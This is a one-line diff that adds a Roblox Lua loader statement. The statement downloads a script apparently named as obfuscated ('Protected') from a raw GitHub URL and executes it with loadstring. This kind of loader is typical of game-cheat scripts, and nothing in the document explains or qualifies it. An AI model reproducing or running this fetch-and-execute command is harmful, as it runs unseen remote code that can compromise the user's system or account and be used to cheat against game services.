@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OrzScript/GoldEx/main/Protected_1941221569967692.lua.txt",true))()
